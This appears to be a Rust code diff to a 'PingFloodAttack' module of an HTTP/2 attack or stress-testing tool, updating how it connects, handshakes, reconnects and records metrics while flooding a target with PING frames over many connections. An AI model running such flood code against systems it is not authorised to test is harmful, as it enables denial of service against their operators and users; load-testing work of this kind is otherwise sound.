@@ -13,10 +13,12 @@
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 
+use async_trait::async_trait;
 use bytes::Bytes;
 use phoenix_core::RawH2Connection;
 use phoenix_metrics::AttackMetrics;
 use tracing::{info, warn, error};
+use url::Url;
 
 use crate::{Attack, AttackContext, AttackError, AttackResult, parse_target};
 
@@ -169,8 +171,17 @@ impl Attack for PingFloodAttack {
                 let mut errors = 0u64;
                 let mut acks_received = 0u64;
                 
-                // Connect to target
-                let mut connection = match RawH2Connection::connect(&target_host, target_port).await {
+                // Connect to target - construct URL from host and port
+                let url_str = format!("https://{}:{}", target_host, target_port);
+                let url = match Url::parse(&url_str) {
+                    Ok(url) => url,
+                    Err(e) => {
+                        error!("Invalid URL for connection {}: {}", conn_idx, e);
+                        return (0, 1, 0);
+                    }
+                };
+                
+                let mut connection = match RawH2Connection::connect(&url).await {
                     Ok(conn) => conn,
                     Err(e) => {
                         error!("Connection {} failed to connect: {}", conn_idx, e);
@@ -179,7 +190,7 @@ impl Attack for PingFloodAttack {
                 };
                 
                 // Perform handshake
-                if let Err(e) = connection.handshake().await {
+                if let Err(e) = connection.perform_handshake().await {
                     error!("Connection {} handshake failed: {}", conn_idx, e);
                     return (0, 1, 0);
                 }
@@ -204,7 +215,7 @@ impl Attack for PingFloodAttack {
                         match connection.send_frame(ping_frame).await {
                             Ok(_) => {
                                 total_pings += 1;
-                                metrics.increment_requests();
+                                metrics.record_request(0, true, 0).await;
                                 
                                 if wait_for_ack {
                                     pending_pings.insert(ping_id, send_time);
@@ -225,10 +236,19 @@ impl Attack for PingFloodAttack {
                                 errors += 1;
                                 
                                 // Try to reconnect
-                                match RawH2Connection::connect(&target_host, target_port).await {
+                                let url_str = format!("https://{}:{}", target_host, target_port);
+                                let url = match Url::parse(&url_str) {
+                                    Ok(url) => url,
+                                    Err(e) => {
+                                        error!("Invalid URL during reconnection: {}", e);
+                                        break;
+                                    }
+                                };
+                                
+                                match RawH2Connection::connect(&url).await {
                                     Ok(new_conn) => {
                                         connection = new_conn;
-                                        if let Err(e) = connection.handshake().await {
+                                        if let Err(e) = connection.perform_handshake().await {
                                             error!("Reconnection handshake failed: {}", e);
                                             break;
                                         }
@@ -246,8 +266,8 @@ impl Attack for PingFloodAttack {
                     
                     // Check for incoming frames (PING ACKs)
                     if wait_for_ack && !pending_pings.is_empty() {
-                        match connection.receive_frame().await {
-                            Ok(Some(frame)) => {
+                        match connection.read_frame().await {
+                            Ok(frame) => {
                                 // Parse frame to check if it's a PING ACK
                                 // This is simplified - in reality we'd parse the frame
                                 // For now, we'll just count any received frame as progress
@@ -258,9 +278,6 @@ impl Attack for PingFloodAttack {
                                 // 2. If type=0x06 and flags=0x01 (PING ACK)
                                 // 3. Parse opaque data to get ping_id
                                 // 4. Remove from pending_pings and record latency
-                            }
-                            Ok(None) => {
-                                // No frame available
                             }
                             Err(e) => {
                                 error!("Error receiving frame: {}", e);
@@ -321,7 +338,7 @@ impl Attack for PingFloodAttack {
         }
         
         let actual_duration = start_time.elapsed();
-        let snapshot = metrics.snapshot();
+        let snapshot = metrics.snapshot().await;
         
         // Calculate actual PPS
         let actual_pps = if actual_duration.as_secs() > 0 {
